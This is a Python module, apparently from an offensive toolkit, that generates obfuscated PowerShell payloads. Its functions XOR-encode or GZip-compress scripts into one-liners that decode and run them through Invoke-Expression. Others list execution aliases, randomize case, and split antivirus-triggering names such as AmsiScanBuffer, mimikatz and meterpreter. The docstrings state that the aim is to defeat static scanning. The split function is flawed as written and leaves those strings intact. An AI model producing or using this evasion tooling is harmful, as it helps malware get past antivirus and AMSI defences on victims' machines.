"""Low-level string and byte transforms for payload obfuscation."""
from __future__ import annotations
import base64
import gzip
import os
import struct


def encode_command(script: str) -> str:
    """UTF-16-LE base64 encode a PS script for use with -EncodedCommand."""
    return base64.b64encode(script.encode("utf-16-le")).decode("ascii")


def to_char_array(s: str) -> str:
    """Convert a string to a PS char-array constructor expression.

    e.g. 'Hi' → '[char[]](0x48,0x69) -join ""'
    """
    hex_vals = ",".join(hex(ord(c)) for c in s)
    return f'([char[]]({hex_vals}) -join "")'


def to_format_string(s: str, chunk_size: int = 3) -> str:
    """Split string into format-string fragments to defeat static pattern matching.

    e.g. 'AmsiScan' with chunk_size=2 → '("{0}{1}{2}{3}"-f"Am","si","Sc","an")'
    """
    chunks = [s[i:i+chunk_size] for i in range(0, len(s), chunk_size)]
    fmt    = "".join(f"{{{i}}}" for i in range(len(chunks)))
    parts  = ",".join(f'"{c}"' for c in chunks)
    return f'("{fmt}"-f{parts})'


def xor_encode(data: bytes, key: bytes) -> bytes:
    """XOR encode bytes with a repeating key."""
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def xor_decode_ps(encoded_b64: str, key_b64: str) -> str:
    """Return a PS one-liner that XOR-decodes and runs the payload at runtime."""
    return (
        f"$k=[System.Convert]::FromBase64String('{key_b64}');"
        f"$d=[System.Convert]::FromBase64String('{encoded_b64}');"
        "$b=New-Object byte[] $d.Length;"
        "for($i=0;$i -lt $d.Length;$i++){$b[$i]=$d[$i] -bxor $k[$i % $k.Length]};"
        "$s=[System.Text.Encoding]::Unicode.GetString($b);"
        "Invoke-Expression $s"
    )


def compress_ps(script: str) -> str:
    """GZip-compress a PS script and return a PS one-liner that decompresses and runs it."""
    compressed = gzip.compress(script.encode("utf-16-le"), compresslevel=9)
    b64        = base64.b64encode(compressed).decode("ascii")
    return (
        f"$data=[System.Convert]::FromBase64String('{b64}');"
        "$ms=New-Object System.IO.MemoryStream(,$data);"
        "$gz=New-Object System.IO.Compression.GZipStream($ms,[System.IO.Compression.CompressionMode]::Decompress);"
        "$sr=New-Object System.IO.StreamReader($gz,[System.Text.Encoding]::Unicode);"
        "$code=$sr.ReadToEnd();"
        "Invoke-Expression $code"
    )


def invoke_expression_alternatives() -> list[str]:
    """Return a list of IEX equivalents for variety."""
    return [
        "Invoke-Expression",
        "&([scriptblock]::Create({0}))",
        ".(Get-Alias iex) {0}",
        "$ExecutionContext.InvokeCommand.InvokeScript({0})",
        "[scriptblock]::Create({0}).Invoke()",
    ]


def randomize_case(s: str) -> str:
    """Randomize case of alphabetic characters in a PS cmdlet name."""
    import random
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)


def split_dangerous(script: str) -> str:
    """Split known AV-triggering substrings via concatenation to defeat static scanning."""
    triggers = [
        ("AmsiScanBuffer",      "Am"  + "si" + "Scan" + "Buffer"),
        ("EtwEventWrite",       "Etw" + "Event" + "Write"),
        ("VirtualProtect",      "Virt" + "ual" + "Protect"),
        ("WriteProcessMemory",  "Write" + "Process" + "Memory"),
        ("MiniDumpWriteDump",   "Mini" + "Dump" + "Write" + "Dump"),
        ("sekurlsa",            "se"  + "kurl" + "sa"),
        ("mimikatz",            "mimi" + "katz"),
        ("PowerSploit",         "Power" + "Sploit"),
        ("Invoke-Mimikatz",     "Invoke" + "-" + "Mimikatz"),
        ("meterpreter",         "mete" + "rpreter"),
        ("ReflectiveDll",       "Refle" + "ctive" + "Dll"),
    ]
    for plain, split in triggers:
        if plain in script:
            script = script.replace(plain, f'("{split}")')
    return script
